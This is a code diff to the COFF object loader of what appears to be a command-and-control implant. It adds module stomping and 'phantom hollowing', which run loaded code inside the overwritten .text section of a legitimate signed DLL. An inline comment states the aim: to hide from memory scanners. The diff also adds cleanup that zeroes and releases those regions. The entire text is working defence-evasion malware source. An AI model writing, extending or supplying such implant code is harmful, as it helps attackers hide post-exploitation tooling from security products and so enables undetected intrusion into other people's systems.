@@ -12,6 +12,10 @@
  */
 #include "agent.h"
 
+#if CONFIG_MODULE_STOMP || CONFIG_PHANTOM_HOLLOW
+#include "postex_loader.h"
+#endif
+
 /* ─── COFF structures ─── */
 
 #pragma pack(push, 1)
@@ -95,9 +99,11 @@ typedef struct {
 /* ─── Internal state for a loaded COFF ─── */
 
 typedef struct {
-    void  *base;        /* VirtualAlloc'd memory for this section */
+    void  *base;        /* VirtualAlloc'd or stomped memory for this section */
     DWORD  size;        /* Allocation size */
     ULONG  chars;       /* Section characteristics */
+    HMODULE hStompedMod;  /* Non-NULL → module-stomped DLL (cleanup: FreeLibrary) */
+    void   *phantomView;  /* Non-NULL → phantom hollow view (cleanup: postex_release_region) */
 } LoadedSection;
 
 typedef struct {
@@ -395,6 +401,10 @@ BOOL coff_load_and_execute(
     }
 
     /* ─── Step 4: Allocate memory for each section ─── */
+#if CONFIG_MODULE_STOMP || CONFIG_PHANTOM_HOLLOW
+    BOOL text_section_stomped = FALSE;
+#endif
+
     for (int i = 0; i < hdr->NumberOfSections; i++) {
         DWORD alloc_size = sections[i].SizeOfRawData;
         if (sections[i].VirtualSize > alloc_size)
@@ -402,16 +412,42 @@ BOOL coff_load_and_execute(
         if (alloc_size == 0)
             alloc_size = 1;
 
-        /* Allocate as RW initially — will fix protections later */
-        loaded[i].base = VirtualAlloc(NULL, alloc_size,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!loaded[i].base) {
-            BeaconPrintf(0x0d, "[!] COFF: VirtualAlloc failed for section %d (size %u)\n", i, alloc_size);
-            goto cleanup_with_diag;
+        /* ── Module stomping / phantom hollowing for .text sections ──
+         * Instead of VirtualAlloc, load a legitimate signed DLL and
+         * overwrite its .text section. Memory scanners see the DLL path
+         * instead of suspicious VirtualAlloc'd RX memory. */
+#if CONFIG_MODULE_STOMP || CONFIG_PHANTOM_HOLLOW
+        BOOL this_section_stomped = FALSE;
+        if (!text_section_stomped &&
+            (sections[i].Characteristics & SCNF_CNT_CODE) &&
+            (sections[i].Characteristics & SCNF_MEM_EXECUTE))
+        {
+            STOMP_REGION stomp;
+            if (postex_acquire_region((SIZE_T)alloc_size, &stomp)) {
+                loaded[i].base = stomp.base;
+                loaded[i].size = (stomp.size > alloc_size) ? stomp.size : alloc_size;
+                loaded[i].chars = sections[i].Characteristics;
+                loaded[i].hStompedMod = stomp.hMod;
+                loaded[i].phantomView = stomp.viewBase;
+                text_section_stomped = TRUE;
+                this_section_stomped = TRUE;
+            }
+            /* Fall through to normal VirtualAlloc if stomping failed */
         }
+        if (!this_section_stomped)
+#endif
+        {
+            /* Allocate as RW initially — will fix protections later */
+            loaded[i].base = VirtualAlloc(NULL, alloc_size,
+                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (!loaded[i].base) {
+                BeaconPrintf(0x0d, "[!] COFF: VirtualAlloc failed for section %d (size %u)\n", i, alloc_size);
+                goto cleanup_with_diag;
+            }
 
-        loaded[i].size = alloc_size;
-        loaded[i].chars = sections[i].Characteristics;
+            loaded[i].size = alloc_size;
+            loaded[i].chars = sections[i].Characteristics;
+        }
 
         /* Copy section data */
         if (sections[i].SizeOfRawData > 0 && sections[i].PointerToRawData > 0) {
@@ -720,8 +756,24 @@ BOOL coff_load_and_execute(
 
     /* Free loaded sections */
     for (int i = 0; i < hdr->NumberOfSections; i++) {
-        if (loaded[i].base)
+        if (!loaded[i].base) continue;
+
+        if (loaded[i].hStompedMod) {
+            /* Module stomping: zero memory, FreeLibrary */
+            DWORD op;
+            VirtualProtect(loaded[i].base, loaded[i].size, PAGE_READWRITE, &op);
+            SecureZeroMemory(loaded[i].base, loaded[i].size);
+            FreeLibrary(loaded[i].hStompedMod);
+        } else if (loaded[i].phantomView) {
+            /* Phantom hollow: zero memory, release region */
+            STOMP_REGION sr = {0};
+            sr.base = loaded[i].base;
+            sr.size = loaded[i].size;
+            sr.viewBase = loaded[i].phantomView;
+            postex_release_region(&sr);
+        } else {
             VirtualFree(loaded[i].base, 0, MEM_RELEASE);
+        }
     }
 
     return TRUE;
@@ -741,8 +793,22 @@ cleanup_syms_diag:
 cleanup_with_diag:
     /* Free loaded sections */
     for (int i = 0; i < MAX_SECTIONS; i++) {
-        if (loaded[i].base)
+        if (!loaded[i].base) continue;
+
+        if (loaded[i].hStompedMod) {
+            DWORD op;
+            VirtualProtect(loaded[i].base, loaded[i].size, PAGE_READWRITE, &op);
+            SecureZeroMemory(loaded[i].base, loaded[i].size);
+            FreeLibrary(loaded[i].hStompedMod);
+        } else if (loaded[i].phantomView) {
+            STOMP_REGION sr = {0};
+            sr.base = loaded[i].base;
+            sr.size = loaded[i].size;
+            sr.viewBase = loaded[i].phantomView;
+            postex_release_region(&sr);
+        } else {
             VirtualFree(loaded[i].base, 0, MEM_RELEASE);
+        }
     }
 
     /* Return diagnostic output to caller even though we failed */
